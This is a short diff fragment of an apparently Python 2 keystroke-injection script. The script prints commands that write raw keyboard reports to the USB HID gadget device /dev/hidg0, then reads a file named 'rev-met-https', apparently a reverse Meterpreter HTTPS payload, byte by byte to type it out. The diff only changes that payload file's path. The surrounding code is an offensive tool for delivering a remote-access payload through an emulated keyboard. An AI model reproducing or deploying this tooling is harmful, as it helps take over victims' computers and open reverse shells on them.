@@ -129,7 +129,7 @@ print '''echo -ne "\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x00" > /dev/hidg0'''
 print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
 print '''sleep 0.5'''
 
-f = open("/sdcard/htdocs/files/rev-met-https", "rb")
+f = open("/sdcard/files/rev-met-https", "rb")
 try:
     byte = f.read(1)
     while byte != "":
